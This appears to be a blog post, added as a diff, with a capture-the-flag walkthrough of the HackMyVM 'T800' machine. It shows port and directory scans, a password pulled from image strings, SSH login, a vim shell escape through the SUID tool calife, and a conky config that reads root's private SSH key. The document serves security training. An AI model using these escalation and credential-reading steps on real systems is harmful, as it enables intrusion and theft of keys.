@@ -1,0 +1,243 @@
+---
+layout: post
+title:  "HackMyVM - T800"
+date:   2021-04-14 20:10:34 +0300
+categories: [hackmyvm,walkthrough]
+pin: true
+tags: [enumeration,strings,vim,calife]
+---
+
+## Port Scan
+```sh
+┌──(alienum㉿kali)-[~]
+└─$ sudo nmap -sS -A -O 10.0.2.232 -p-
+[sudo] password for alienum:
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-14 22:32 EEST
+Nmap scan report for 10.0.2.232 (10.0.2.232)
+Host is up (0.00077s latency).
+Not shown: 65533 closed ports
+PORT    STATE SERVICE VERSION
+80/tcp  open  http    nginx 1.14.2
+|_http-server-header: nginx/1.14.2
+|_http-title: Site doesnt have a title (text/html).
+800/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey:
+|   2048 b6:be:5a:0b:ec:0b:53:69:b6:7b:54:46:7d:40:56:75 (RSA)
+|   256 a3:3c:a5:67:ba:42:94:04:49:47:24:30:63:91:ef:c3 (ECDSA)
+|_  256 b2:75:86:d8:45:99:9a:9d:89:10:41:9a:d0:03:6c:a8 (ED25519)
+MAC Address: 08:00:27:C8:0D:C8 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.6
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+## Directory Scan
+
+```sh
+┌──(alienum㉿kali)-[~]
+└─$ gobuster dir -k -u http://10.0.2.232 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x .php,.txt
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.0.2.232
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Extensions:              txt,php
+[+] Timeout:                 10s
+===============================================================
+2021/04/14 22:44:23 Starting gobuster in directory enumeration mode
+===============================================================
+/robots.txt           (Status: 200) [Size: 13]
+/sexy                 (Status: 301) [Size: 185] [--> http://10.0.2.232/sexy/]
+```
+
+## Robots
+
+```sh
+┌──(alienum㉿kali)-[~]
+└─$ curl http://10.0.2.232/robots.txt
+/sexy/*.jpeg
+```
+
+## Finding the images
+
+- Gobuster again
+
+```sh
+┌──(alienum㉿kali)-[~]
+└─$ gobuster dir -k -u http://10.0.2.232/sexy -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x .jpeg
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.0.2.232/sexy
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Extensions:              jpeg
+[+] Timeout:                 10s
+===============================================================
+2021/04/14 22:47:30 Starting gobuster in directory enumeration mode
+===============================================================
+/nudeslut.jpeg        (Status: 200) [Size: 11863]
+```
+
+## Download the image and strings
+
+```sh
+┌──(alienum㉿kali)-[~/Desktop]
+└─$ wget http://10.0.2.232/sexy/nudeslut.jpeg
+--2021-04-14 22:51:24--  http://10.0.2.232/sexy/nudeslut.jpeg
+Connecting to 10.0.2.232:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 11863 (12K) [image/jpeg]
+Saving to: ‘nudeslut.jpeg’
+
+nudeslut.jpeg                 100%[==============================================>]  11.58K  --.-KB/s    in 0s      
+
+2021-04-14 22:51:24 (105 MB/s) - ‘nudeslut.jpeg’ saved [11863/11863]
+```
+
+```sh
+┌──(alienum㉿kali)-[~/Desktop]
+└─$ strings nudeslut.jpeg
+JFIF
+passwd:chmodxheart
+...
+```
+
+## Finding the username
+
+- Go back to index.html
+- View Page Source
+
+![image](/assets/img/t800/1.PNG)
+
+```
+<!-- Im ruut-->
+```
+
+## SSH Login
+
+`ruut` : `chmodxheart`
+
+```sh
+┌──(alienum㉿kali)-[~]
+└─$ ssh ruut@10.0.2.232 -p 800
+```
+
+## SUID
+```sh
+ruut@t800:~$ find / -perm -u=s -type f 2>/dev/null
+...
+/usr/bin/calife
+...
+```
+
+## Priv Esc | calife
+
+```sh
+ruut@t800:~$ find / -perm -u=s -type f 2>/dev/null
+...
+/usr/bin/calife
+...
+ruut@t800:~$ man calife
+ruut@t800:~$ calife superuut
+Unknown user superuut.
+
+ruut@t800:~$ ls /home
+ruut  superruut
+ruut@t800:~$ calife superruut
+Password: chmodxheart
+
+## AFTER VIM SHOWN TYPE :
+:!/bin/sh
+
+$ id
+uid=1001(superruut) gid=1001(superruut) groups=1001(superruut)
+$ /usr/bin/script -qc /bin/bash /dev/null
+```
+
+- Type `/usr/bin/script -qc /bin/bash /dev/null` to get better shell
+
+## SUID again
+```sh
+superruut@t800:/home/superruut$ find / -perm -u=s -type f 2>/dev/null
+...
+/usr/bin/conky
+...
+```
+
+## Understanding the conky
+```sh
+superruut@t800:/home/superruut$ /usr/bin/conky -h
+Usage: /usr/bin/conky [OPTION]...
+conky is a system monitor that renders text on desktop or to own transparent
+window. Command line options will override configurations defined in config
+file.
+   -v, --version             version
+   -q, --quiet               quiet mode
+   -D, --debug               increase debugging output, ie. -DD for more debugging
+   -c, --config=FILE         config file to load
+   -C, --print-config        print the builtin default config to stdout
+...
+```
+
+## Find the conky.conf
+
+- The default `conky.conf` is located to `/etc/conky/conky.conf`
+- Copy the `/etc/conky/conky.conf` to `/home/superruut/`
+- Edit it to display the
+
+```sh
+conky.config = {
+    alignment = 'top_left',
+    background = false,
+    border_width = 1,
+    cpu_avg_samples = 2,
+	  default_color = 'white',
+    default_outline_color = 'white',
+    default_shade_color = 'white',
+    draw_borders = false,
+    draw_graph_borders = true,
+    draw_outline = false,
+    draw_shades = false,
+    use_xft = true,
+    font = 'DejaVu Sans Mono:size=12',
+    gap_x = 5,
+    gap_y = 60,
+    minimum_height = 5,
+	minimum_width = 5,
+    net_avg_samples = 2,
+    no_buffers = true,
+    out_to_console = true,
+    out_to_stderr = false,
+    extra_newline = false,
+    own_window = true,
+    own_window_class = 'Conky',
+    own_window_type = 'desktop',
+    stippled_borders = 0,
+    update_interval = 1.0,
+    uppercase = false,
+    use_spacer = 'none',
+    show_graph_scale = false,
+    show_graph_range = false
+}
+
+conky.text = [[
+${cat /root/.ssh/id_rsa}
+]]
+```
+
+```
+ssh -o ForwardX11=yes -i id_rsa superruut@127.0.0.1 -p800
+```
